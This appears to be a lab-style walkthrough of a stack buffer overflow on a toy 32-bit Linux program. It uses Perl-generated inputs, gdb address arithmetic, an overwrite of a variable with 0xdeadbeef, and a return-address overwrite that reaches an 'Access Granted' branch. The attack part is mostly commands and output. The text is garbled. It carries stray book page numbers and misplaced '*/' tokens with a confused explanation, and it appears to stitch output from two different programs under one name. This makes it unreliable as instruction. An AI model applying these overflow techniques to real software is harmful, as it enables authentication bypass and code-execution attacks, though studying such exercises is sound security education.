/* The below code is executed in the linux environment.

Perl, an interpreted programming language, boasts a print command that's well-suited for generating extensive character sequences. It's worth noting that Perl also allows executing commands via the command line, achieved through the use of the -e switch 

An entire shell command can be executed like a function, returning its output in place. This is done by surrounding the command with parentheses and prefixing a dollar sign.

We're now executing the basic_buffer_exploit using Shell and Perl to generate overflow in a more efficient way */


Source 1:

user@muffin:~/muffinhubsrc $ ./basic_buffer_exploit */ $(perl -e 'print "A"x30')

/
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
[STRCPY] copying 30 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
/


user@muffin:~/muffinhubsrc $ gdb -q
(gdb) print 0xbffff7f4 - 0xbffff7e0
$1 = 20
Exploitation 135
(gdb) quit


user@muffin:~/muffinhubsrc $ ./basic_buffer_exploit / $(perl -e 'print "A"x20 . "ABCD"')

/
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
[STRCPY] copying 24 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAABCD'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAABCD'
[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241)
/

user@muffin:~/muffinhubsrc $


Explanation:

" In the directory `~/muffinhubsrc`, upon executing `./basic_buffer_exploit */ $(perl -e 'print "A"x30')`, the following actions occur:

- A forward slash ("/") is used as an argument.
- Prior to the buffer overflow, the contents of `buffer_two`, `buffer_one`, and `value` are displayed.
- A total of 30 bytes is copied into `buffer_two` during the `[STRCPY]` operation.
- Subsequent to the buffer overflow, `buffer_two` and a portion of `buffer_one` are filled with 'A's, and `value` holds the hexadecimal value `0x41414141`.
- The execution results in a segmentation fault, leading to the program crashing. This is indicated by the message "Segmentation fault (core dumped)".

The GNU Debugger (`gdb`) is then utilized for analysis. By calculating the difference between the addresses of `value` and `buffer_two`, a difference of 20 bytes is determined. The execution concludes with an informative message.

In another instance, executing `./basic_buffer_exploit / $(perl -e 'print "A"x20 . "ABCD"')` presents a similar scenario. The buffer overflow causes 24 bytes to be copied into `buffer_two`. Consequently, the contents of `buffer_two`, `buffer_one`, and `value` undergo alteration.Consequently, when intending to manipulate the value variable with a specific value like 0xdeadbeef, it's necessary to write those bytes into memory in reverse order. This ensures that the value is stored correctly due to the endianness of the architecture. 

Note : The "*/" used after the "/basic_buffer_exploit" is an comment identifier, not a part of the command."


Source 2:

user@muffin:~/muffinhubsrc $ ./basic_buffer_exploit $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')

/
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
[STRCPY] copying 24 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAA??'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAA??'
[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef)
/

user@muffin:~/muffinhubsrc $ 


/*This technique can be applied to overwrite the return address in the basic_vuffer_exploit.c program with an exact value  */


user@muffin:~/muffinhubrc $ gcc -g -o basic_buffer_exploit basic_buffer_exploit.c 
user@muffin:~/muffinhubsrc $ gdb -q ./basic_buffer_exploit
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) disass main
Dump of assembler code for function main:
0x08048474 <main+0>: push ebp
0x08048475 <main+1>: mov ebp,esp
0x08048477 <main+3>: sub esp,0x8
0x0804847a <main+6>: and esp,0xfffffff0
0x0804847d <main+9>: mov eax,0x0
0x08048482 <main+14>: sub esp,eax
0x08048484 <main+16>: cmp DWORD PTR [ebp+8],0x1
0x08048488 <main+20>: jg 0x80484ab <main+55>
0x0804848a <main+22>: mov eax,DWORD PTR [ebp+12]
136 0x300
0x0804848d <main+25>: mov eax,DWORD PTR [eax]
0x0804848f <main+27>: mov DWORD PTR [esp+4],eax
0x08048493 <main+31>: mov DWORD PTR [esp],0x80485e5
0x0804849a <main+38>: call 0x804831c <printf@plt>
0x0804849f <main+43>: mov DWORD PTR [esp],0x0
0x080484a6 <main+50>: call 0x804833c <exit@plt>
0x080484ab <main+55>: mov eax,DWORD PTR [ebp+12]
0x080484ae <main+58>: add eax,0x4
0x080484b1 <main+61>: mov eax,DWORD PTR [eax]
0x080484b3 <main+63>: mov DWORD PTR [esp],eax
0x080484b6 <main+66>: call 0x8048414 <check_authentication>
0x080484bb <main+71>: test eax,eax
0x080484bd <main+73>: je 0x80484e5 <main+113>
0x080484bf <main+75>: mov DWORD PTR [esp],0x80485fb
0x080484c6 <main+82>: call 0x804831c <printf@plt>
0x080484cb <main+87>: mov DWORD PTR [esp],0x8048619
0x080484d2 <main+94>: call 0x804831c <printf@plt>
0x080484d7 <main+99>: mov DWORD PTR [esp],0x8048630
0x080484de <main+106>: call 0x804831c <printf@plt>
0x080484e3 <main+111>: jmp 0x80484f1 <main+125>
0x080484e5 <main+113>: mov DWORD PTR [esp],0x804864d
0x080484ec <main+120>: call 0x804831c <printf@plt>
0x080484f1 <main+125>: leave 
0x080484f2 <main+126>: ret 

End of assembler dump.
(gdb)


From '<main+75>' to '<main+106>', returns the "Access Granted" statement.

user@muffin:~/muffinhubsrc $ ./basic_buffer_exploit $(perl -e 'print "\xbf\x84\x04\x08"x10')
-=-=-=-=-=-=-=-=-=-=-=-=-=-
 Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
Segmentation fault (core dumped)
user@muffin:~/muffinhubsrc $
